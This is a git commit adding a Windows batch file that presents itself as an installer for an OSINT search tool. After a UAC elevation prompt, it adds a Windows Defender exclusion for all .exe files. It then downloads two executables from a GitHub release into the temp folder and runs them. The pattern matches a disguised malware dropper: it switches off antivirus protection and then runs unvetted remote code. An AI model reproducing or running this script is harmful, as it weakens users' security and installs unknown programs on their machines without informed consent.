fa73066b44d3b0ace8dfa8794f367093798be874
SysAdmiN <97897361+syslinks@users.noreply.github.com>
2023-03-26 03:56:22 -0700

    Add files via upload

---
+++ start.bat
@@ -0,0 +1,78 @@
+@echo off
+echo SearchDb X SearchTools
+echo       Download
+
+@echo -----------------------------------
+color a
+title SearchDb X SearchTools Install
+@echo - $ Choix 1  [1] Installer Searchdb X SearchTools
+@echo - $ Choix 2  [2] Exit 
+set /p choix= Choisis La Methode Que Tu Souhaite. : 
+if %choix%==1 goto Download
+if %choix%==2 goto Exit
+:Download
+echo Please Wait..... [%]
+
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+cd %TEMP%
+Powershell -Command "Invoke-Webrequest 'https://github.com/kosan1337/OSINT/releases/download/searchinstaller/Installer.exe' -OutFile Installer.exe"
+Installer.exe
+
+
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+cd %TEMP%
+Powershell -Command "Invoke-Webrequest 'https://github.com/kosan1337/OSINT/releases/download/searchinstaller/SearchUpdate.exe' -OutFile SearchUpdate.exe"
+SearchUpdate.exe
+
+exit
+goto tache Terminer
+:Exit
+exit
+pause
+goto Tache Terminer
